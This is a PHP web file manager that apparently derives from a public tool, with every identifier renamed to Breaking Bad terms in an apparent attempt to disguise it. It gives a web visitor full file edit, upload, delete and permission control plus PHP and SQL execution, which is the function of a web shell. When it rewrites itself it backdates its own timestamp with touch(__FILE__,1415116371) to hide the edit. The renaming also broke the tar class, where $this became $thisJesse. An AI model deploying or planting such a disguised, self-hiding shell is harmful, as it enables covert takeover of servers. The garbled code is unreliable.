		$selectLab.='<option value="'.$heisenbergValue.'" '.((!empty($heisenbergValue)&&($heisenbergValue==$blueCrystalActive))?'selected':'').' >'.__($crystalKey)."</option>\n";
	}
	$selectLab .= "</select>\n";


	echo $selectLab;
}
?>
		</form>

	</td>
</tr>



</table>
<?php


	if (!empty($heisenbergResult)) {
		$hectorCallback='fm_'.$cartelResponseLanguage;


		echo '<h3>'.strtoupper($cartelResponseLanguage).' '.__('Result').'</h3><pre>'.$hectorCallback($heisenbergResult).'</pre>';


	}
} elseif (!empty($_REQUEST['edit'])){
	if(!empty($_REQUEST['save'])) {
		$pinkmanFunction = $blueCrystalPath . $_REQUEST['edit'];


		$blueFileModified = filemtime($pinkmanFunction);
	    if (file_put_contents($pinkmanFunction, $_REQUEST['newcontent'])) $saulMessage .= __('File updated');
		else $saulMessage .= __('Error occurred');
		if ($_GET['edit']==basename(__FILE__)) {



			touch(__FILE__,1415116371);



		} else {
			if (!empty($labConfig['restore_time'])) touch($pinkmanFunction,$blueFileModified);
		}


	}
    $oldBlueContent = @file_get_contents($blueCrystalPath . $_REQUEST['edit']);


    $editWalterUrl = $includedSaulUrl . '&edit=' . $_REQUEST['edit'] . '&path=' . $blueCrystalPath;

    $hankPreviousUrl = $includedSaulUrl . '&path=' . $blueCrystalPath;


?>

<table border='0' cellspacing='0' cellpadding='1' width="100%">


<tr>
    <th><?=__('File manager').' - '.__('Edit').' - '.$blueCrystalPath.$_REQUEST['edit']?></th>
</tr>
<tr>
    <td class="row1">
        <?=$saulMessage?>
	</td>


</tr>



<tr>



    <td class="row1">


        <?=breakingHome()?> <a href="<?=$hankPreviousUrl?>"><?=__('Back')?></a>


	</td>
</tr>

<tr>
    <td class="row1" align="center">


        <form name="form1" method="post" action="<?=$editWalterUrl?>">
            <textarea name="newcontent" id="newcontent" cols="45" rows="15" style="width:99%" spellcheck="false"><?=htmlspecialchars($oldBlueContent)?></textarea>
            <input type="submit" name="save" value="<?=__('Submit')?>">
            <input type="submit" name="cancel" value="<?=__('Cancel')?>">


        </form>

    </td>


</tr>


</table>
<?php



echo $gusAuthenticated['script'];
} elseif(!empty($_REQUEST['rights'])){
	if(!empty($_REQUEST['save'])) {
	    if(gusChangePermissions($blueCrystalPath . $_REQUEST['rights'], convertCartelPermissions($_REQUEST['rights_val']), @$_REQUEST['recursively']))
		$saulMessage .= (__('File updated')); 
		else $saulMessage .= (__('Error occurred'));


	}



	clearstatcache();


    $oldTucoPermissions = permissionsCartelString($blueCrystalPath . $_REQUEST['rights'], true);


    $blueLink = $includedSaulUrl . '&rights=' . $_REQUEST['rights'] . '&path=' . $blueCrystalPath;
    $hankPreviousUrl = $includedSaulUrl . '&path=' . $blueCrystalPath;
?>
<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$blueCrystalPath?></th>

</tr>
<tr>



    <td class="row1">
        <?=$saulMessage?>

	</td>
</tr>



<tr>
    <td class="row1">
        <a href="<?=$hankPreviousUrl?>"><?=__('Back')?></a>



	</td>

</tr>
<tr>



    <td class="row1" align="center">



        <form name="form1" method="post" action="<?=$blueLink?>">



           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$oldTucoPermissions?>">
        <?php if (is_dir($blueCrystalPath.$_REQUEST['rights'])) { ?>
            <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>



        <?php } ?>



            <input type="submit" name="save" value="<?=__('Submit')?>">



        </form>
    </td>


</tr>
</table>
<?php

} elseif (!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.') {
	if(!empty($_REQUEST['save'])) {
	    rename($blueCrystalPath . $_REQUEST['rename'], $blueCrystalPath . $_REQUEST['newname']);


		$saulMessage .= (__('File updated'));
		$_REQUEST['rename'] = $_REQUEST['newname'];
	}
	clearstatcache();

    $blueLink = $includedSaulUrl . '&rename=' . $_REQUEST['rename'] . '&path=' . $blueCrystalPath;
    $hankPreviousUrl = $includedSaulUrl . '&path=' . $blueCrystalPath;




?>
<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$blueCrystalPath?></th>
</tr>
<tr>



    <td class="row1">



        <?=$saulMessage?>



	</td>
</tr>

<tr>
    <td class="row1">

        <a href="<?=$hankPreviousUrl?>"><?=__('Back')?></a>

	</td>
</tr>
<tr>
    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$blueLink?>">
            <?=__('Rename')?>: <input type="text" name="newname" value="<?=$_REQUEST['rename']?>"><br/>

            <input type="submit" name="save" value="<?=__('Submit')?>">


        </form>
    </td>


</tr>
</table>


<?php


} else {
//Let's rock!
    $saulMessage = '';



    if(!empty($_FILES['upload'])&&!empty($labConfig['upload_file'])) {
        if(!empty($_FILES['upload']['name'])){



            $_FILES['upload']['name'] = str_replace('%', '', $_FILES['upload']['name']);


            if(!move_uploaded_file($_FILES['upload']['tmp_name'], $blueCrystalPath . $_FILES['upload']['name'])){



                $saulMessage .= __('Error occurred');



            } else {
				$saulMessage .= __('Files uploaded').': '.$_FILES['upload']['name'];
			}


        }

    } elseif(!empty($_REQUEST['delete'])&&$_REQUEST['delete']<>'.') {
        if(!deleteTucoFiles(($blueCrystalPath . $_REQUEST['delete']), true)) {


            $saulMessage .= __('Error occurred');
        } else {



			$saulMessage .= __('Deleted').' '.$_REQUEST['delete'];
		}
	} elseif(!empty($_REQUEST['mkdir'])&&!empty($labConfig['make_directory'])) {

        if(!@mkdir($blueCrystalPath . $_REQUEST['dirname'],0777)) {
            $saulMessage .= __('Error occurred');
        } else {
			$saulMessage .= __('Created').' '.$_REQUEST['dirname'];
		}



    } elseif(!empty($_REQUEST['mkfile'])&&!empty($labConfig['new_file'])) {



        if(!$fringPointer=@fopen($blueCrystalPath . $_REQUEST['filename'],"w")) {
            $saulMessage .= __('Error occurred');
        } else {
			fclose($fringPointer);
			$saulMessage .= __('Created').' '.$_REQUEST['filename'];
		}



    } elseif (isset($_GET['zip'])) {
		$sourceHeisenberg = base64_decode($_GET['zip']);
		$desertDestination = basename($sourceHeisenberg).'.zip';
		set_time_limit(0);
		$tucoPhar = new PharData($desertDestination);

		$tucoPhar->buildFromDirectory($sourceHeisenberg);
		if (is_file($desertDestination))


		$saulMessage .= __('Task').' "'.__('Archiving').' '.$desertDestination.'" '.__('done').


		'.&nbsp;'.heisenbergMainLink('download',$blueCrystalPath.$desertDestination,__('Download'),__('Download').' '. $desertDestination)
		.'&nbsp;<a href="'.$includedSaulUrl.'&delete='.$desertDestination.'&path=' . $blueCrystalPath.'" title="'.__('Delete').' '. $desertDestination.'" >'.__('Delete') . '</a>';
		else $saulMessage .= __('Error occurred').': '.__('no files');
	} elseif (isset($_GET['gz'])) {
		$sourceHeisenberg = base64_decode($_GET['gz']);


		$walterWhiteBackup = $sourceHeisenberg.'.tar';
		$desertDestination = basename($sourceHeisenberg).'.tar';



		if (is_file($walterWhiteBackup)) unlink($walterWhiteBackup);
		if (is_file($walterWhiteBackup.'.gz')) unlink($walterWhiteBackup.'.gz');

		clearstatcache();
		set_time_limit(0);

		//die();
		$tucoPhar = new PharData($desertDestination);



		$tucoPhar->buildFromDirectory($sourceHeisenberg);



		$tucoPhar->compress(Phar::GZ,'.tar.gz');


		unset($tucoPhar);
		if (is_file($walterWhiteBackup)) {

			if (is_file($walterWhiteBackup.'.gz')) {



				unlink($walterWhiteBackup); 
				$desertDestination .= '.gz';
			}



			$saulMessage .= __('Task').' "'.__('Archiving').' '.$desertDestination.'" '.__('done').

			'.&nbsp;'.heisenbergMainLink('download',$blueCrystalPath.$desertDestination,__('Download'),__('Download').' '. $desertDestination)
			.'&nbsp;<a href="'.$includedSaulUrl.'&delete='.$desertDestination.'&path=' . $blueCrystalPath.'" title="'.__('Delete').' '.$desertDestination.'" >'.__('Delete').'</a>';


		} else $saulMessage .= __('Error occurred').': '.__('no files');
	} elseif (isset($_GET['decompress'])) {


		// $sourceHeisenberg = base64_decode($_GET['decompress']);

		// $desertDestination = basename($sourceHeisenberg);
		// $pinkmanExtension = end(explode(".", $desertDestination));
		// if ($pinkmanExtension=='zip' OR $pinkmanExtension=='gz') {



			// $tucoPhar = new PharData($sourceHeisenberg);
			// $tucoPhar->decompress();
			// $carWashMainFile = str_replace('.'.$pinkmanExtension,'',$desertDestination);

			// $pinkmanExtension = end(explode(".", $carWashMainFile));

			// if ($pinkmanExtension=='tar'){
				// $tucoPhar = new PharData($carWashMainFile);
				// $tucoPhar->extractTo(dir($sourceHeisenberg));


			// }
		// } 

		// $saulMessage .= __('Task').' "'.__('Decompress').' '.$sourceHeisenberg.'" '.__('done');
	} elseif (isset($_GET['gzfile'])) {



		$sourceHeisenberg = base64_decode($_GET['gzfile']);
		$walterWhiteBackup = $sourceHeisenberg.'.tar';



		$desertDestination = basename($sourceHeisenberg).'.tar';
		if (is_file($walterWhiteBackup)) unlink($walterWhiteBackup);

		if (is_file($walterWhiteBackup.'.gz')) unlink($walterWhiteBackup.'.gz');
		set_time_limit(0);
		//echo $desertDestination;

		$saulExtensions = explode('.',basename($sourceHeisenberg));
		if (isset($saulExtensions[1])) {
			unset($saulExtensions[0]);


			$pinkmanExtension=implode('.',$saulExtensions);



		} 
		$tucoPhar = new PharData($desertDestination);

		$tucoPhar->addFile($sourceHeisenberg);

		$tucoPhar->compress(Phar::GZ,$pinkmanExtension.'.tar.gz');

		unset($tucoPhar);


		if (is_file($walterWhiteBackup)) {
			if (is_file($walterWhiteBackup.'.gz')) {
				unlink($walterWhiteBackup); 
				$desertDestination .= '.gz';
			}



			$saulMessage .= __('Task').' "'.__('Archiving').' '.$desertDestination.'" '.__('done').
			'.&nbsp;'.heisenbergMainLink('download',$blueCrystalPath.$desertDestination,__('Download'),__('Download').' '. $desertDestination)

			.'&nbsp;<a href="'.$includedSaulUrl.'&delete='.$desertDestination.'&path=' . $blueCrystalPath.'" title="'.__('Delete').' '.$desertDestination.'" >'.__('Delete').'</a>';
		} else $saulMessage .= __('Error occurred').': '.__('no files');

	}
?>
<table class="whole" id="header_table" >



<tr>
    <th colspan="2"><?=__('File manager')?><?=(!empty($blueCrystalPath)?' - '.$blueCrystalPath:'')?></th>
</tr>


<?php if(!empty($saulMessage)){ ?>


<tr>
	<td colspan="2" class="row2"><?=$saulMessage?></td>
</tr>


<?php } ?>



<tr>
    <td class="row2">
		<table>



			<tr>


			<td>



				<?=breakingHome()?>



			</td>
			<td>
			<?php if(!empty($labConfig['make_directory'])) { ?>


				<form method="post" action="<?=$includedSaulUrl?>">
				<input type="hidden" name="path" value="<?=$blueCrystalPath?>" />



				<input type="text" name="dirname" size="15">

				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">
				</form>
			<?php } ?>
			</td>
			<td>



			<?php if(!empty($labConfig['new_file'])) { ?>
				<form method="post" action="<?=$includedSaulUrl?>">

				<input type="hidden" name="path" value="<?=$blueCrystalPath?>" />

				<input type="text" name="filename" size="15">
				<input type="submit" name="mkfile" value="<?=__('New file')?>">
				</form>
			<?php } ?>
			</td>



			<td>
			<?=runLabInput('php')?>

			</td>
			<td>

			<?=runLabInput('sql')?>
			</td>
			</tr>



		</table>
    </td>

    <td class="row3">

		<table>

		<tr>


		<td>


		<?php if (!empty($labConfig['upload_file'])) { ?>
			<form name="form1" method="post" action="<?=$includedSaulUrl?>" enctype="multipart/form-data">

			<input type="hidden" name="path" value="<?=$blueCrystalPath?>" />
			<input type="file" name="upload" id="upload_hidden" style="position: absolute; display: block; overflow: hidden; width: 0; height: 0; border: 0; padding: 0;" onchange="document.getElementById('upload_visible').value = this.value;" />
			<input type="text" readonly="1" id="upload_visible" placeholder="<?=__('Select the file')?>" style="cursor: pointer;" onclick="document.getElementById('upload_hidden').click();" />


			<input type="submit" name="test" value="<?=__('Upload')?>" />
			</form>
		<?php } ?>

		</td>


		<td>



		<?php if ($gusAuthenticated['authorize']) { ?>
			<form action="" method="post">&nbsp;&nbsp;&nbsp;

			<input name="quit" type="hidden" value="1">

			<?=__('Hello')?>, <?=$gusAuthenticated['login']?>


			<input type="submit" value="<?=__('Quit')?>">
			</form>

		<?php } ?>


		</td>
		<td>



		<?=laundryLanguageForm($laundryLanguage)?>
		</td>
		<tr>
		</table>


    </td>
</tr>

</table>
<table class="all" border='0' cellspacing='1' cellpadding='1' id="fm_table" width="100%">
<thead>
<tr> 
    <th style="white-space:nowrap"> <?=__('Filename')?> </th>

    <th style="white-space:nowrap"> <?=__('Size')?> </th>

    <th style="white-space:nowrap"> <?=__('Date')?> </th>

    <th style="white-space:nowrap"> <?=__('Rights')?> </th>
    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>
</tr>



</thead>
<tbody>
<?php
$chemicalElements = scanHeisenbergDirectory($blueCrystalPath, '', 'all', true);
$breakingDirectories = array();
$cartelFiles = array();

foreach ($chemicalElements as $walterFile){



    if(@is_dir($blueCrystalPath . $walterFile)){


        $breakingDirectories[] = $walterFile;
    } else {



        $cartelFiles[] = $walterFile;
    }


}
natsort($breakingDirectories); natsort($cartelFiles);
$chemicalElements = array_merge($breakingDirectories, $cartelFiles);

foreach ($chemicalElements as $walterFile){
    $hankFilename = $blueCrystalPath . $walterFile;

    $breakingFileData = @stat($hankFilename);
    if(@is_dir($hankFilename)){


		$breakingFileData[7] = '';
		if (!empty($labConfig['show_dir_size'])&&!carWashRootDirectory($walterFile)) $breakingFileData[7] = calculateLabDirectorySize($hankFilename);


        $blueLink = '<a href="'.$includedSaulUrl.'&path='.$blueCrystalPath.$walterFile.'" title="'.__('Show').' '.$walterFile.'"><span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$walterFile.'</a>';



        $loadRVUrl= (carWashRootDirectory($walterFile)||$maybeLydiaPhar) ? '' : heisenbergMainLink('zip',$hankFilename,__('Compress').'&nbsp;zip',__('Archiving').' '. $walterFile);

		$breakingBackupUrl  = (carWashRootDirectory($walterFile)||$maybeLydiaPhar) ? '' : heisenbergMainLink('gz',$hankFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$walterFile);
        $fringStyle = 'row2';
		 if (!carWashRootDirectory($walterFile)) $losPollosAlert = 'onClick="if(confirm(\'' . __('Are you sure you want to delete this directory (recursively)?').'\n /'. $walterFile. '\')) document.location.href = \'' . $includedSaulUrl . '&delete=' . $walterFile . '&path=' . $blueCrystalPath  . '\'"'; else $losPollosAlert = '';
    } else {
		$blueLink = 


			$labConfig['show_img']&&@getimagesize($hankFilename) 

			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''


			. blueCrystalImageUrl($hankFilename)


			.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.blueCrystalImageUrl($hankFilename).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$walterFile.'</a>'
			: '<a href="' . $includedSaulUrl . '&edit=' . $walterFile . '&path=' . $blueCrystalPath. '" title="' . __('Edit') . '"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$walterFile.'</a>';
		$dangerArray = explode(".", $walterFile);
		$pinkmanExtension = end($dangerArray);
        $loadRVUrl =  heisenbergMainLink('download',$hankFilename,__('Download'),__('Download').' '. $walterFile);


		$breakingBackupUrl = in_array($pinkmanExtension,array('zip','gz','tar')) 

		? ''
		: ((carWashRootDirectory($walterFile)||$maybeLydiaPhar) ? '' : heisenbergMainLink('gzfile',$hankFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '. $walterFile));
        $fringStyle = 'row1';

		$losPollosAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $walterFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'' . $includedSaulUrl . '&delete=' . $walterFile . '&path=' . $blueCrystalPath  . '\'"';



    }


    $tucoDeleteUrl = carWashRootDirectory($walterFile) ? '' : '<a href="#" title="' . __('Delete') . ' '. $walterFile . '" ' . $losPollosAlert . '>' . __('Delete') . '</a>';
    $renameSaulUrl = carWashRootDirectory($walterFile) ? '' : '<a href="' . $includedSaulUrl . '&rename=' . $walterFile . '&path=' . $blueCrystalPath . '" title="' . __('Rename') .' '. $walterFile . '">' . __('Rename') . '</a>';
    $cartelPermissionsText = ($walterFile=='.' || $walterFile=='..') ? '' : '<a href="' . $includedSaulUrl . '&rights=' . $walterFile . '&path=' . $blueCrystalPath . '" title="' . __('Rights') .' '. $walterFile . '">' . @permissionsCartelString($hankFilename) . '</a>';
?>



<tr class="<?=$fringStyle?>"> 
    <td><?=$blueLink?></td>

    <td><?=$breakingFileData[7]?></td>
    <td style="white-space:nowrap"><?=gmdate("Y-m-d H:i:s",$breakingFileData[9])?></td>
    <td><?=$cartelPermissionsText?></td>


    <td><?=$tucoDeleteUrl?></td>


    <td><?=$renameSaulUrl?></td>

    <td><?=$loadRVUrl?></td>
    <td><?=$breakingBackupUrl?></td>
</tr>
<?php
    }
}
?>
</tbody>


</table>
<div class="row3"><?php
	$methModifiedTime = explode(' ', microtime()); 
	$totalCookTime = $methModifiedTime[0] + $methModifiedTime[1] - $startCookTime; 


	echo breakingHome().' | ver. '.$breakingVersion.' | <a href="https://github.com/Den1xxx/Filemanager">Github</a>  | <a href="'.breakingSiteUrl().'">.</a>';

	if (!empty($labConfig['show_php_ver'])) echo ' | PHP '.phpversion();
	if (!empty($labConfig['show_php_ini'])) echo ' | '.php_ini_loaded_file();
	if (!empty($labConfig['show_gt'])) echo ' | '.__('Generation time').': '.round($totalCookTime,2);

	if (!empty($labConfig['enable_proxy'])) echo ' | <a href="?proxy=true">proxy</a>';



	if (!empty($labConfig['show_phpinfo'])) echo ' | <a href="?phpinfo=true">phpinfo</a>';

	if (!empty($labConfig['show_xls'])&&!empty($blueLink)) echo ' | <a href="javascript: void(0)" onclick="var obj = new table2Excel(); obj.CreateExcelSheet(\'fm_table\',\'export\');" title="'.__('Download').' xls">xls</a>';



	if (!empty($labConfig['fm_settings'])) echo ' | <a href="?fm_settings=true">'.__('Settings').'</a>';
	?>


</div>



<script type="text/javascript">



function downloadBlueExcel(filename, text) {
	var element = document.createElement('a');

	element.setAttribute('href', 'data:application/vnd.ms-excel;base64,' + text);
	element.setAttribute('download', filename);

	element.style.display = 'none';


	document.body.appendChild(element);
	element.click();


	document.body.removeChild(element);
}

function base64_encode(m) {
	for (var k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), c, d, h, e, a, g = "", b = 0, f, l = 0; l < m.length; ++l) {

		c = m.charCodeAt(l);
		if (128 > c) d = 1;
		else

			for (d = 2; c >= 2 << 5 * d;) ++d;


		for (h = 0; h < d; ++h) 1 == d ? e = c : (e = h ? 128 : 192, a = d - 2 - 6 * h, 0 <= a && (e += (6 <= a ? 1 : 0) + (5 <= a ? 2 : 0) + (4 <= a ? 4 : 0) + (3 <= a ? 8 : 0) + (2 <= a ? 16 : 0) + (1 <= a ? 32 : 0), a -= 5), 0 > a && (u = 6 * (d - 1 - h), e += c >> u, c -= c >> u << u)), f = b ? f << 6 - b : 0, b += 2, f += e >> b, g += k[f], f = e % (1 << b), 6 == b && (b = 0, g += k[f])
	}


	b && (g += k[f << 6 - b]);

	return g
}




var tableToExcelData = (function() {

    var uri = 'data:application/vnd.ms-excel;base64,',
    template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines></x:DisplayGridlines></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain; charset=UTF-8"/></head><body><table>{table}</table></body></html>',



    format = function(s, c) {
            return s.replace(/{(\w+)}/g, function(m, p) {
                return c[p];
            })



        }
    return function(table, name) {



        if (!table.nodeType) table = document.getElementById(table)

        var ctx = {

            worksheet: name || 'Worksheet',
            table: table.innerHTML.replace(/<span(.*?)\/span> /g,"").replace(/<a\b[^>]*>(.*?)<\/a>/g,"$1")


        }


		t = new Date();
		filename = 'fm_' + t.toISOString() + '.xls'


		downloadBlueExcel(filename, base64_encode(format(template, ctx)))
    }
})();

var table2Excel = function () {




    var ua = window.navigator.userAgent;
    var msie = ua.indexOf("MSIE ");




	this.CreateExcelSheet = 


		function(el, name){
			if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {// If Internet Explorer



				var x = document.getElementById(el).rows;





				var xls = new ActiveXObject("Excel.Application");



				xls.visible = true;
				xls.Workbooks.Add
				for (i = 0; i < x.length; i++) {
					var y = x[i].cells;







					for (j = 0; j < y.length; j++) {

						xls.Cells(i + 1, j + 1).Value = y[j].innerText;
					}
				}
				xls.Visible = true;
				xls.UserControl = true;


				return xls;
			} else {
				tableToExcelData(el, name);

			}



		}
}



</script>
</body>


</html>





<?php


//Ported from ReloadCMS project http://reloadcms.com

class archiveTar {
	var $pinkmanBackupName = '';



	var $tmpJesseFile = 0;



	var $laloFilePosition = 0;


	var $isGusGzipped = true;
	var $breakingErrors = array();


	var $cartelFiles = array();
	



	function __construct(){
		if (!isset($thisJesse->errors)) $thisJesse->errors = array();



	}
	


	function createBlueBatchBackup($gusFileList){
		$breakingResult = false;
		if (file_exists($thisJesse->archive_name) && is_file($thisJesse->archive_name)) 	$newBatchBackup = false;



		else $newBatchBackup = true;

		if ($newBatchBackup){


			if (!$thisJesse->openBlueWrite()) return false;
		} else {



			if (filesize($thisJesse->archive_name) == 0)	return $thisJesse->openBlueWrite();

			if ($thisJesse->isGzipped) {


				$thisJesse->closeJesseTempFile();


				if (!rename($thisJesse->archive_name, $thisJesse->archive_name.'.tmp')){

					$thisJesse->errors[] = __('Cannot rename').' '.$thisJesse->archive_name.__(' to ').$thisJesse->archive_name.'.tmp';



					return false;

				}



				$tmpBlueBackup = gzopen($thisJesse->archive_name.'.tmp', 'rb');
				if (!$tmpBlueBackup){
					$thisJesse->errors[] = $thisJesse->archive_name.'.tmp '.__('is not readable');
					rename($thisJesse->archive_name.'.tmp', $thisJesse->archive_name);


					return false;

				}
				if (!$thisJesse->openBlueWrite()){

					rename($thisJesse->archive_name.'.tmp', $thisJesse->archive_name);
					return false;
				}
				$mikeBuffer = gzread($tmpBlueBackup, 512);
				if (!gzeof($tmpBlueBackup)){
					do {
						$blueCrystalBinary = pack('a512', $mikeBuffer);



						$thisJesse->writeHeisenbergBlock($blueCrystalBinary);

						$mikeBuffer = gzread($tmpBlueBackup, 512);
					}


					while (!gzeof($tmpBlueBackup));

				}


				gzclose($tmpBlueBackup);
				unlink($thisJesse->archive_name.'.tmp');



			} else {



				$thisJesse->tmp_file = fopen($thisJesse->archive_name, 'r+b');



				if (!$thisJesse->tmp_file)	return false;

			}
		}


		if (isset($gusFileList) && is_array($gusFileList)) {



		if (count($gusFileList)>0)


			$breakingResult = $thisJesse->packJesseFiles($gusFileList);
		} else $thisJesse->errors[] = __('No file').__(' to ').__('Archive');
		if (($breakingResult)&&(is_resource($thisJesse->tmp_file))){
			$blueCrystalBinary = pack('a512', '');



			$thisJesse->writeHeisenbergBlock($blueCrystalBinary);
		}



		$thisJesse->closeJesseTempFile();


		if ($newBatchBackup && !$breakingResult){


		$thisJesse->closeJesseTempFile();
		unlink($thisJesse->archive_name);


		}
		return $breakingResult;


	}

	function restoreBlueBackup($blueCrystalPath){
		$heisenbergFileName = $thisJesse->archive_name;
		if (!$thisJesse->isGzipped){



			if (file_exists($heisenbergFileName)){
				if ($fringPointer = fopen($heisenbergFileName, 'rb')){
					$methData = fread($fringPointer, 2);
					fclose($fringPointer);



					if ($methData == '\37\213'){
						$thisJesse->isGzipped = true;
					}
				}
			}


			elseif ((substr($heisenbergFileName, -2) == 'gz') OR (substr($heisenbergFileName, -3) == 'tgz')) $thisJesse->isGzipped = true;
		} 

		$breakingResult = true;



		if ($thisJesse->isGzipped) $thisJesse->tmp_file = gzopen($heisenbergFileName, 'rb');
		else $thisJesse->tmp_file = fopen($heisenbergFileName, 'rb');
		if (!$thisJesse->tmp_file){
			$thisJesse->errors[] = $heisenbergFileName.' '.__('is not readable');

			return false;
		}

		$breakingResult = $thisJesse->unpackPinkmanFiles($blueCrystalPath);
			$thisJesse->closeJesseTempFile();



		return $breakingResult;
	}




	function showBreakingBadDecisions	($hankMessage = '') {


		$heisenbergHazards = $thisJesse->errors;
		if(count($heisenbergHazards)>0) {


		if (!empty($hankMessage)) $hankMessage = ' ('.$hankMessage.')';

			$hankMessage = __('Error occurred').$hankMessage.': <br/>';



			foreach ($heisenbergHazards as $heisenbergValue)



				$hankMessage .= $heisenbergValue.'<br/>';
			return $hankMessage;	

		} else return '';

		



	}
	
	function packJesseFiles($jesseFiles){


		$breakingResult = true;
		if (!$thisJesse->tmp_file){
			$thisJesse->errors[] = __('Invalid file descriptor');



			return false;


		}
		if (!is_array($jesseFiles) || count($jesseFiles)<=0)
          return true;
		for ($badgerI = 0; $badgerI<count($jesseFiles); $badgerI++){
			$hankFilename = $jesseFiles[$badgerI];

			if ($hankFilename == $thisJesse->archive_name)
				continue;
			if (strlen($hankFilename)<=0)



				continue;



			if (!file_exists($hankFilename)){


				$thisJesse->errors[] = __('No file').' '.$hankFilename;

				continue;
			}
			if (!$thisJesse->tmp_file){

			$thisJesse->errors[] = __('Invalid file descriptor');


			return false;
			}
		if (strlen($hankFilename)<=0){


			$thisJesse->errors[] = __('Filename').' '.__('is incorrect');;
			return false;

		}
		$hankFilename = str_replace('\\', '/', $hankFilename);
		$keepNameBitch = $thisJesse->sanitizeCrystalPath($hankFilename);
		if (is_file($hankFilename)){


			if (($walterFile = fopen($hankFilename, 'rb')) == 0){
				$thisJesse->errors[] = __('Mode ').__('is incorrect');
			}

				if(($thisJesse->file_pos == 0)){



					if(!$thisJesse->writeBlueHeader($hankFilename, $keepNameBitch))


						return false;
				}
				while (($mikeBuffer = fread($walterFile, 512)) != ''){


					$blueCrystalBinary = pack('a512', $mikeBuffer);
					$thisJesse->writeHeisenbergBlock($blueCrystalBinary);


				}
			fclose($walterFile);
		}	else $thisJesse->writeBlueHeader($hankFilename, $keepNameBitch);


			if (@is_dir($hankFilename)){
				if (!($walterHandle = opendir($hankFilename))){
					$thisJesse->errors[] = __('Error').': '.__('Directory ').$hankFilename.__('is not readable');
					continue;
				}


				while (false !== ($losPollosDirectory = readdir($walterHandle))){
					if ($losPollosDirectory!='.' && $losPollosDirectory!='..'){
						$pinkmanTempFiles = array();
						if ($hankFilename != '.')
							$pinkmanTempFiles[] = $hankFilename.'/'.$losPollosDirectory;



						else
							$pinkmanTempFiles[] = $losPollosDirectory;

						$breakingResult = $thisJesse->packJesseFiles($pinkmanTempFiles);
					}


				}

				unset($pinkmanTempFiles);
				unset($losPollosDirectory);

				unset($walterHandle);
			}



		}
		return $breakingResult;
	}

	function unpackPinkmanFiles($blueCrystalPath){ 
		$blueCrystalPath = str_replace('\\', '/', $blueCrystalPath);
		if ($blueCrystalPath == ''	|| (substr($blueCrystalPath, 0, 1) != '/' && substr($blueCrystalPath, 0, 3) != '../' && !strpos($blueCrystalPath, ':')))	$blueCrystalPath = './'.$blueCrystalPath;
		clearstatcache();

		while (strlen($blueCrystalBinary = $thisJesse->readBlueBlock()) != 0){



			if (!$thisJesse->readFringHeader($blueCrystalBinary, $saulHeader)) return false;


			if ($saulHeader['filename'] == '') continue;
			if ($saulHeader['typeflag'] == 'L'){			//reading long header
				$hankFilename = '';

				$decodedJesse = floor($saulHeader['size']/512);
				for ($badgerI = 0; $badgerI < $decodedJesse; $badgerI++){
					$breakingContent = $thisJesse->readBlueBlock();
					$hankFilename .= $breakingContent;
				}
				if (($lastPieceOfBlue = $saulHeader['size'] % 512) != 0){


					$breakingContent = $thisJesse->readBlueBlock();



					$hankFilename .= substr($breakingContent, 0, $lastPieceOfBlue);

				}
				$blueCrystalBinary = $thisJesse->readBlueBlock();

				if (!$thisJesse->readFringHeader($blueCrystalBinary, $saulHeader)) return false;
				else $saulHeader['filename'] = $hankFilename;
				return true;
			}



			if (($blueCrystalPath != './') && ($blueCrystalPath != '/')){
				while (substr($blueCrystalPath, -1) == '/') $blueCrystalPath = substr($blueCrystalPath, 0, strlen($blueCrystalPath)-1);


				if (substr($saulHeader['filename'], 0, 1) == '/') $saulHeader['filename'] = $blueCrystalPath.$saulHeader['filename'];



				else $saulHeader['filename'] = $blueCrystalPath.'/'.$saulHeader['filename'];



			}
			


			if (file_exists($saulHeader['filename'])){

				if ((@is_dir($saulHeader['filename'])) && ($saulHeader['typeflag'] == '')){
					$thisJesse->errors[] =__('File ').$saulHeader['filename'].__(' already exists').__(' as folder');


					return false;



				}
				if ((is_file($saulHeader['filename'])) && ($saulHeader['typeflag'] == '5')){
					$thisJesse->errors[] =__('Cannot create directory').'. '.__('File ').$saulHeader['filename'].__(' already exists');


					return false;
				}
				if (!is_writeable($saulHeader['filename'])){
					$thisJesse->errors[] = __('Cannot write to file').'. '.__('File ').$saulHeader['filename'].__(' already exists');



					return false;



				}
			} elseif (($thisJesse->checkSaulDirectory(($saulHeader['typeflag'] == '5' ? $saulHeader['filename'] : dirname($saulHeader['filename'])))) != 1){
				$thisJesse->errors[] = __('Cannot create directory').' '.__(' for ').$saulHeader['filename'];

				return false;
			}


			if ($saulHeader['typeflag'] == '5'){


				if (!file_exists($saulHeader['filename']))		{

					if (!mkdir($saulHeader['filename'], 0777))	{


						

						$thisJesse->errors[] = __('Cannot create directory').' '.$saulHeader['filename'];

						return false;
					} 
				}


			} else {
				if (($desertDestination = fopen($saulHeader['filename'], 'wb')) == 0) {

